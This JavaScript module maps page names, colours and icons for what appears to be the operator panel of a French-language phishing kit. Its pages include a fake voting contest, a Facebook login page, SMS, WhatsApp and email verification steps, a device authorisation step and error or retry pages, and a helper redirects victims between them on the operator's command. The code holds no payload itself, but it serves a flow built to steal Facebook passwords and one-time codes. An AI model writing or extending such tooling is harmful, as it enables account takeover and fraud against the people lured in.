const PAGE_META = {
  'index.html': {
    pageName: 'Page concours',
    pageColor: '#6366f1',
    pageIcon: 'fas fa-vote-yea'
  },
  'vote.html': {
    pageName: 'Page concours',
    pageColor: '#6366f1',
    pageIcon: 'fas fa-vote-yea'
  },
  'connexion_f.php': {
    pageName: 'Connexion Facebook',
    pageColor: '#1877f2',
    pageIcon: 'fab fa-facebook-f'
  },
  'loading.php': {
    pageName: 'Chargement',
    pageColor: '#ff9800',
    pageIcon: 'fas fa-spinner'
  },
  'sms_verification.php': {
    pageName: 'Vérification SMS',
    pageColor: '#4caf50',
    pageIcon: 'fas fa-sms'
  },
  'whatsapp_verification.php': {
    pageName: 'Vérification WhatsApp',
    pageColor: '#25d366',
    pageIcon: 'fab fa-whatsapp'
  },
  'email_verification.php': {
    pageName: 'Vérification Email',
    pageColor: '#ea4335',
    pageIcon: 'fas fa-envelope'
  },
  'authorize_device.php': {
    pageName: 'Autorisation appareil',
    pageColor: '#9c27b0',
    pageIcon: 'fas fa-shield-alt'
  },
  'vote_approved.php': {
    pageName: 'Vote approuvé',
    pageColor: '#4caf50',
    pageIcon: 'fas fa-check-double'
  },
  'technical_error.php': {
    pageName: 'Erreur technique',
    pageColor: '#f44336',
    pageIcon: 'fas fa-exclamation-triangle'
  },
  'retry.php': {
    pageName: 'Réessayer',
    pageColor: '#607d8b',
    pageIcon: 'fas fa-redo'
  }
};

function getPageMeta(page) {
  return PAGE_META[page] || {
    pageName: page,
    pageColor: '#666',
    pageIcon: 'fas fa-file'
  };
}

function resolveActionPage(action, redirect) {
  if (action === 'redirect' && redirect) {
    return `${redirect}.php`;
  }
  if (action === 'custom' && redirect) {
    return `${redirect}.php`;
  }
  return `${action}.php`;
}

module.exports = { PAGE_META, getPageMeta, resolveActionPage };
